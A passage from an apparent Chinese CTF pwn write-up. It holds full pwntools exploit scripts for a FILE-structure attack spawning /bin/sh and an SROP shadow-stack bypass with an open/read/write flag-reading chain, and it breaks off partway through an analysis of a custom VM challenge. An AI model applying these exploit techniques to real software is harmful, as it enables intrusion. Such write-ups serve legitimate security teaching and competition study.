class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;nc1.ctfplus.cn&#x27;,32387)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ph</span>(<span class="params">var</span>):</span><br><span class="line">    var_name = [name <span class="keyword">for</span> name, value <span class="keyword">in</span> <span class="built_in">globals</span>().items() <span class="keyword">if</span> value <span class="keyword">is</span> var][<span class="number">0</span>]</span><br><span class="line">    log.success(<span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span>  &gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(var)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru   = <span class="keyword">lambda</span> a,b=<span class="literal">False</span> : p.recvuntil(a,drop=b)</span><br><span class="line">rl  = <span class="keyword">lambda</span>    :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;\x29&#x27;</span></span><br><span class="line"><span class="comment">#GDBR(0x01266)</span></span><br><span class="line">sd(payload)</span><br><span class="line"></span><br><span class="line">libc_base = u64(rc(<span class="number">5</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>)) &lt;&lt; <span class="number">8</span> </span><br><span class="line">libc_base -= <span class="number">0x29c00</span></span><br><span class="line">ph( libc_base)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">IO_stdout = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">ph(IO_stdout)</span><br><span class="line">IO_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">ph(IO_wfile_jumps)</span><br><span class="line">IO_stderr = libc_base + libc.sym[<span class="string">&#x27;_IO_2_1_stderr_&#x27;</span>]</span><br><span class="line">ph(IO_stderr)</span><br><span class="line"></span><br><span class="line">one_gadget = [<span class="number">0xddf43</span>,<span class="number">0xfb062</span>,<span class="number">0xfb06a</span>,<span class="number">0xfb06f</span>]</span><br><span class="line">one = libc_base + one_gadget[<span class="number">3</span>]</span><br><span class="line">IO_addr = IO_stdout</span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x0000000000152b5a: add dword ptr [rbx + riz*4 + 0x48], esi; mov eax, dword ptr [rsp + 0x10]; mov rdi, qword ptr [rax]; mov rax, qword ptr [rdi + 0x38]; call qword ptr [rax + 0x18]; </span></span><br><span class="line"><span class="comment"># 0x000000000014fe89: add byte ptr [rax], al; mov rax, qword ptr [rax + 0x38]; test rax, rax; je 0x14fe9d; lea rdi, [rbx + 0xc8]; call rax; </span></span><br><span class="line"><span class="comment"># 0x0000000000153285: mov eax, dword ptr [rbx + 0x60]; mov rax, qword ptr [rax + 0x38]; test rax, rax; je 0x153297; lea rdi, [rbx + 0x58]; call rax; </span></span><br><span class="line"></span><br><span class="line">magic = libc_base + <span class="number">0x152b62</span></span><br><span class="line">mov_rax_rax_38_lea_rbx_58_call_rax_18 = libc_base + <span class="number">0x153288</span></span><br><span class="line">system = libc_base + <span class="number">0x52c92</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">IO = flat(</span><br><span class="line">&#123;</span><br><span class="line">    <span class="number">0x28</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="number">0x48</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="number">0x40</span> : IO_addr + <span class="number">0x40</span>-<span class="number">0x10</span>,</span><br><span class="line">    <span class="number">0x58</span> : <span class="string">b&#x27;/bin/sh\x00&#x27;</span>,</span><br><span class="line">    <span class="number">0x60</span> : mov_rax_rax_38_lea_rbx_58_call_rax_18,</span><br><span class="line">    <span class="number">0x80</span> : system,</span><br><span class="line">    <span class="number">0x88</span> : IO_addr + <span class="number">0x30</span>,</span><br><span class="line">    <span class="number">0xa0</span> : IO_addr + <span class="number">0x98</span> - <span class="number">0xe0</span>,</span><br><span class="line">    <span class="number">0x98</span> : IO_addr + <span class="number">0x48</span>,</span><br><span class="line">    <span class="number">0xc0</span> : <span class="number">1</span>,</span><br><span class="line">    <span class="number">0xd8</span> : IO_wfile_jumps + <span class="number">0x30</span>,</span><br><span class="line">&#125;</span><br><span class="line">,filler=<span class="string">b&#x27;\x00&#x27;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">sd(p64(IO_stdout+<span class="number">0x20</span>))</span><br><span class="line"><span class="comment">#GDB(&quot;b *(_IO_switch_to_wget_mode+33)&quot;)</span></span><br><span class="line"></span><br><span class="line">sd(IO[<span class="number">0x20</span>:])</span><br><span class="line"></span><br><span class="line"><span class="comment">#GDB()</span></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="shadow"><a href="#shadow" class="headerlink" title="shadow"></a>shadow</h3><p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=Mzk1ZmUyNTUyMWFmOTBhYzQ5NWU3ZTQ5NTMwN2Y4YzdfazBDSnA0NW9hbElSeWJjTFJsUFRGNWN6OE5rSDZ0bGJfVG9rZW46R05CcGJxOUV1b3Naeml4aGgxUWNFSkhzbkpiXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>这里比较重要的就是这个 signal(11, handler) 函数，当我们程序段错误的时候就会跳转到 handler 函数进行处理，</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=MjY5MGE2NDU5ODUyNTg2Mjg3NzJlYmUzMTk0NjMyZGNfRVhSZlhaZWQ0M05kVjFHV2xLcjU4T1JoWTY1Zko2dzhfVG9rZW46U2JHaWJoeVFob3ZWZ0h4c3BLWGNZcjFmbjVmXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>Handler 函数非常明显的栈溢出，这题的难点在于影子栈保护机制，如果返回地址被非法纂改，它会检测到，并且把返回地址改回来。</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://hynuxtsec.feishu.cn/space/api/box/stream/download/asynccode/?code=OGI2YTU1YmFhMjFiYTQ5ZjZiNTNhMjg2ZDJmNDYxZWJfTFFaWGRITDhMemk0U0JydzJHdktaY0p4RE1WM2h3Z2dfVG9rZW46QUdpaGIwM20wbzVoSlh4NlBxNGNxdk5XbjllXzE3NzAxNDIzNjk6MTc3MDE0NTk2OV9WNA" alt="img"></p>
<p>这里有两个读入函数 sub_1393 是一个有栈溢出的读入函数，我们可以通过溢出修改rbp上的地址的第一个字节，来实现第二个读入短距离任意栈写入，这个时候我们就可以控制执行流到 0x14xx 处，我选择到 0x1465 ，这可以让存储返回地址的索引非法加一，这个时候就会导致定位错误，这个时候下来我们可以再次通过 sub_1393 函数修改rbp，再次实现短距离栈任意写，这次可以挑一个有libc的地方，写入一个字节，printf就会配合把这个libc地址打印出来，就实现了libc的泄露 ，然后后面的检查由于定位错误，会导致段错误进入处理函数，我们就可以利用这个性质打一下 srop ，随后 orw 即可。 </p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;nc1.ctfplus.cn&#x27;,45772)</span></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment"># 0x7fffffffd688</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GDB</span>(<span class="params">script=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    gdb.attach(p, gdbscript=script)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">GDBR</span>(<span class="params">script=<span class="string">&quot;&quot;</span></span>):</span><br><span class="line">    gdb.attach(p, gdbscript=<span class="string">f&quot;b *$rebase(<span class="subst">&#123;script&#125;</span>)&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ph</span>(<span class="params">var</span>):</span><br><span class="line">    var_name = [name <span class="keyword">for</span> name, value <span class="keyword">in</span> <span class="built_in">globals</span>().items() <span class="keyword">if</span> value <span class="keyword">is</span> var][<span class="number">0</span>]</span><br><span class="line">    log.success(<span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span>  &gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(var)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">phlen</span>(<span class="params">var</span>):</span><br><span class="line">    var_name = [name <span class="keyword">for</span> name, value <span class="keyword">in</span> <span class="built_in">globals</span>().items() <span class="keyword">if</span> value <span class="keyword">is</span> var][<span class="number">0</span>]</span><br><span class="line">    log.success(<span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span>(DEC)  &gt;&gt; <span class="subst">&#123;<span class="built_in">len</span>(var)&#125;</span>&quot;</span>)</span><br><span class="line">    log.success(<span class="string">f&quot;<span class="subst">&#123;var_name&#125;</span>(HEX)  &gt;&gt; <span class="subst">&#123;<span class="built_in">hex</span>(<span class="built_in">len</span>(var))&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_srop</span>(<span class="params">rdi=<span class="number">0</span>,rsi=<span class="number">0</span>,rax=<span class="number">0</span>,rdx=<span class="number">0</span>,rsp=<span class="number">0</span>,rbp=<span class="number">0</span>,rip=<span class="number">0</span>,r10=<span class="number">0</span></span>):</span><br><span class="line">    sigFrame = SigreturnFrame()</span><br><span class="line">    sigFrame.rax = rax</span><br><span class="line">    sigFrame.rdi = rdi</span><br><span class="line">    sigFrame.rsi = rsi</span><br><span class="line">    sigFrame.rdx = rdx</span><br><span class="line">    sigFrame.rsp = rsp</span><br><span class="line">    sigFrame.rbp = rbp</span><br><span class="line">    sigFrame.rip = rip</span><br><span class="line">    sigFrame.r10 = r10</span><br><span class="line">    srop = <span class="built_in">bytes</span>(sigFrame)</span><br><span class="line">    <span class="keyword">return</span> srop</span><br><span class="line"></span><br><span class="line">sd = <span class="keyword">lambda</span> data : p.send(data)</span><br><span class="line">sa  = <span class="keyword">lambda</span> text,data  :p.sendafter(text, data)</span><br><span class="line">sl  = <span class="keyword">lambda</span> data   :p.sendline(data)</span><br><span class="line">sla = <span class="keyword">lambda</span> text,data  :p.sendlineafter(text, data)</span><br><span class="line">rc   = <span class="keyword">lambda</span> num=<span class="number">4096</span>   :p.recv(num)</span><br><span class="line">ru   = <span class="keyword">lambda</span> a,b=<span class="literal">False</span> : p.recvuntil(a,drop=b)</span><br><span class="line">rl  = <span class="keyword">lambda</span>    :p.recvline()</span><br><span class="line">pr = <span class="keyword">lambda</span> num=<span class="number">4096</span> :<span class="built_in">print</span>(p.recv(num))</span><br><span class="line">l32 = <span class="keyword">lambda</span>    :u32(p.recvuntil(<span class="string">b&#x27;\xf7&#x27;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">l64 = <span class="keyword">lambda</span>    :u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu32    = <span class="keyword">lambda</span>    :u32(p.recv(<span class="number">4</span>).ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>    :u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">int16   = <span class="keyword">lambda</span> data   :<span class="built_in">int</span>(data,<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + <span class="string">b&#x27;\x90&#x27;</span></span><br><span class="line"></span><br><span class="line">command = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">handle SIGSEGV pass nostop noprint</span></span><br><span class="line"><span class="string">b *$rebase(0x015C2)</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#GDB(command)</span></span><br><span class="line"></span><br><span class="line">sd(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sd(<span class="string">b&#x27;\x65&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span> + <span class="string">b&#x27;\xc0&#x27;</span></span><br><span class="line"><span class="comment">#GDBR(0x0014E9)</span></span><br><span class="line"><span class="comment">#GDB(command)</span></span><br><span class="line">sd(payload)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">sleep(<span class="number">0.2</span>)</span><br><span class="line">sd(<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x2a161</span></span><br><span class="line">ph(libc_base)</span><br><span class="line"><span class="comment">#GDB()</span></span><br><span class="line">pause()</span><br><span class="line"></span><br><span class="line">rw = libc_base + <span class="number">0x203000</span> + <span class="number">0x200</span></span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">read = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"><span class="built_in">open</span> = libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>]</span><br><span class="line">write = libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">pop_rsi = libc_base + <span class="number">0x0000000000110a7d</span></span><br><span class="line">pop_rdi = libc_base + <span class="number">0x000000000010f78b</span></span><br><span class="line">pop_rcx = libc_base + <span class="number">0x00000000000a877e</span></span><br><span class="line">pop_rax = libc_base + <span class="number">0x00000000000dd237</span></span><br><span class="line"><span class="comment"># 0x000000000004b2e2: mov edx, eax; mov eax, 8; sub eax, edx; ret; </span></span><br><span class="line">mov_edx_eax = libc_base + <span class="number">0x000000000004b2e2</span></span><br><span class="line">syscall_ret = libc_base + <span class="number">0x0000000000098fb6</span></span><br><span class="line">srop = set_srop(rax=<span class="number">0</span>,rbp=rw, rsi=rw-<span class="number">8</span>,rsp=rw-<span class="number">8</span>,rdx=<span class="number">0x100</span>,rdi=<span class="number">0</span>,rip=syscall_ret)</span><br><span class="line">payload = <span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x20</span> + srop</span><br><span class="line">sd(payload)</span><br><span class="line">flag = libc_base + <span class="number">0x203000</span> + <span class="number">0x200</span> + <span class="number">0xa0</span></span><br><span class="line">rop = p64(pop_rdi) + p64(flag) + p64(pop_rsi) + p64(<span class="number">0</span>) + p64(<span class="built_in">open</span>)</span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">3</span>) + p64(pop_rsi) + p64(flag+<span class="number">0x100</span>) + p64(pop_rax) + p64(<span class="number">0x100</span>) + p64(mov_edx_eax) + p64(read)</span><br><span class="line">rop += p64(pop_rdi) + p64(<span class="number">1</span>) + p64(pop_rsi) + p64(flag+<span class="number">0x100</span>) + p64(pop_rax) + p64(<span class="number">0x100</span>) + p64(mov_edx_eax) + p64(write)</span><br><span class="line">rop += <span class="string">b&#x27;flag\x00&#x27;</span></span><br><span class="line">sd(rop)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h3 id="Micro-Macro"><a href="#Micro-Macro" class="headerlink" title="Micro?Macro!"></a>Micro?Macro!</h3><p>程序概述</p>
<p>基本信息</p>
<ul>
<li><strong>文件名</strong>: <code>pwn</code> (原始名可能是<code>vuln</code>)</li>
<li><strong>架构</strong>: ELF 64-bit LSB PIE executable, x86-64</li>
<li><strong>编译器</strong>: GCC for GNU&#x2F;Linux 3.2.0</li>
<li><strong>符号</strong>: Not stripped (包含符号信息，便于调试)</li>
<li><strong>Libc</strong>: libc.so.6 (GLIBC 2.2.5)</li>
</ul>
<p>保护机制</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">RELRO:      Full RELRO       - GOT表只读，但可在运行前写入</span><br><span class="line">Stack:      Canary found     - 栈保护已启用</span><br><span class="line">NX:         NX enabled       - 栈不可执行</span><br><span class="line">PIE:        PIE enabled      - 地址随机化</span><br><span class="line">SHSTK:      Enabled          - Shadow Stack (Intel CET)</span><br><span class="line">IBT:        Enabled          - Indirect Branch Tracking (Intel CET)</span><br></pre></td></tr></table></figure>

<p><strong>关键结论</strong>: 所有现代保护机制均已启用，传统的栈溢出、ROP等技术难以直接应用。</p>
<p>程序逻辑分析</p>
<p>主函数流程</p>
<p>程序实现了一个自定义的<strong>虚拟机解释器</strong>，其核心功能：</p>
<ol>
<li><p><strong>初始化</strong> (<code>vm_init @ 0x1191</code>):</p>
<ol>
<li>使用当前时间作为随机种子</li>
<li>生成一个随机的slot索引 <code>rand_slot</code> (范围: 16-31)</li>
<li>清空<code>values</code>数组 (32个slot，每个16字节)</li>
<li>清空<code>program</code>数组 (最多64条指令)</li>
<li><strong>关键操作</strong>: <code>values[rand_slot].type = 1</code> (指针类型)</li>
<li><strong>关键操作</strong>: <code>values[rand_slot].data = &amp;values</code> (数组基址)</li>
</ol>
</li>
<li><p><strong>命令解析循环</strong> (<code>main @ 0x2435</code>):</p>
<ol>
<li><pre><code class="language-Plain">&gt; help          - 显示帮助信息
&gt; inst &lt;params&gt; - 添加一条VM指令
&gt; run           - 执行已添加的所有指令
&gt; dbg           - 调试信息 (泄漏rand_slot值)
&gt; exit          - 退出程序
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">3. **指令添加** (`vm_add_inst @ 0x206e`):</span><br><span class="line"></span><br><span class="line">   1. 解析用户输入的opcode和参数</span><br><span class="line">   2. 验证参数有效性</span><br><span class="line">   3. 将指令存入`program`数组</span><br><span class="line">   4. 最多允许64条指令</span><br><span class="line"></span><br><span class="line">4. **指令执行** (`vm_run @ 0x23c9` -&gt; `vm_exec_inst @ 0x1dd5`):</span><br><span class="line"></span><br><span class="line">   1. 遍历`program`数组中的所有指令</span><br><span class="line">   2. 根据opcode调用相应的handler</span><br><span class="line"></span><br><span class="line">数据结构</span><br><span class="line"></span><br><span class="line">Slot结构 (16字节)</span><br><span class="line"></span><br><span class="line">```C</span><br><span class="line">struct Slot &#123;</span><br><span class="line">    uint32_t type;      // 0=Int, 1=Ptr, 2=FuncPtr</span><br><span class="line">    uint32_t reserved;</span><br><span class="line">    uint64_t data;      // 数据值或指针</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">struct Slot values[32];  // 全局数组 @ 0x50c0</span><br></pre></td></tr></table></figure>
</code></pre>
</li>
</ol>
</li>
</ol>
<p>指令结构 (24字节)</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Instruction</span> &#123;</span></span><br><span class="line">    <span class="type">uint8_t</span> opcode;</span><br><span class="line">    <span class="type">uint8_t</span> padding[<span class="number">3</span>];</span><br><span class="line">    <span class="type">uint32_t</span> param1;</span><br><span class="line">    <span class="type">uint32_t</span> param2;</span><br><span class="line">    <span class="type">uint32_t</span> param3;</span><br><span class="line">    <span class="type">uint64_t</span> param4;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">Instruction</span> <span class="title">program</span>[64];</span>  <span class="comment">// 全局数组 @ 0x52c0</span></span><br></pre></td></tr></table></figure>

<p>虚拟机指令集</p>
<p>Opcode映射表</p>
<p>程序使用了一个<strong>混淆的opcode编码方案</strong>。通过逆向和暴力测试，确定了以下映射：</p>
<table>
<thead>
<tr>
<th>操作码</th>
<th>Hex值</th>
<th>参数格式</th>
<th>功能描述</th>
</tr>
</thead>
<tbody><tr>
<td>Op 0 (SetImm)</td>
<td>0x3a (58)</td>
<td>dest, imm</td>
<td>设置slot为立即数, type&#x3D;0</td>
</tr>
<tr>
<td>Op 1 (Add)</td>
<td>0x7e (126)</td>
<td>dest, src1, src2</td>
<td>加法，支持指针算术</td>
</tr>
<tr>
<td>Op 2 (CMOV)</td>
<td>0x91 (145)</td>
<td>dest, src1, src2</td>
<td>条件移动</td>
</tr>
<tr>
<td>Op 3 (Load)</td>
<td>0x52 (82)</td>
<td>dest, src</td>
<td>解引用: dest &#x3D; *src</td>
</tr>
<tr>
<td>Op 4 (Store)</td>
<td>0xc4 (196)</td>
<td>dest, src</td>
<td>写内存: *dest &#x3D; src</td>
</tr>
<tr>
<td>Op 5 (Call)</td>
<td>0x1b (27)</td>
<td>func, arg</td>
<td>函数调用 (type必须&#x3D;2)</td>
</tr>
<tr>
<td>Op 6 (Print)</td>
<td>0x68 (104)</td>
<td>slot</td>
<td>打印slot的值</td>
</tr>
<tr>
<td>Op 7 (Exit)</td>
<td>0xaf (175)</td>
<td>无</td>
<td>退出程序</td>
</tr>
</tbody></table>
<p>指令详解</p>
<h4 id="1-SetImm-0x3a"><a href="#1-SetImm-0x3a" class="headerlink" title="1. SetImm (0x3a)"></a>1. SetImm (0x3a)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">指令格式: inst 58 &lt;dest&gt; &lt;imm_value&gt;</span><br><span class="line">功能: values[dest].type = 0 (Int)</span><br><span class="line">      values[dest].data = imm_value</span><br><span class="line">示例: inst 58 0 12345  # Slot 0 = 12345</span><br></pre></td></tr></table></figure>

<h4 id="2-Add-0x7e"><a href="#2-Add-0x7e" class="headerlink" title="2. Add (0x7e)"></a>2. Add (0x7e)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">指令格式: inst 126 &lt;dest&gt; &lt;src1&gt; &lt;src2&gt;</span><br><span class="line">功能: </span><br><span class="line">  - 如果src1或src2是Ptr (type=1), 结果继承Ptr类型</span><br><span class="line">  - 否则结果为Int (type=0)</span><br><span class="line">  - values[dest].data = values[src1].data + values[src2].data</span><br><span class="line">示例: inst 126 0 1 2  # Slot 0 = Slot 1 + Slot 2</span><br></pre></td></tr></table></figure>

<p><strong>关键特性</strong>: 支持<strong>指针算术</strong>！如果一个操作数是指针，加上一个整数偏移，结果仍是指针。</p>
<h4 id="3-Load-0x52"><a href="#3-Load-0x52" class="headerlink" title="3. Load (0x52)"></a>3. Load (0x52)</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">指令格式: inst 82 &lt;dest&gt; &lt;src&gt;</span><br><span class="line">前提条件: values[src].type == 1 (必须是指针)</span><br><span class="line">功能: values[dest].type = 0 (Int)</span><br><span class="line">      values[dest].data = *((uint64_t*)values[src].data)</span><br><span class="line">示例: inst 82 1 0  # Slot 1 = *(Slot 0)  (解引用)</span><br></pre></td></tr></table></figure>

<p><strong>安全检查</strong>: 要求src必须是指针类型，但<strong>不检查指针指向的地址是否有效</strong>。</p>
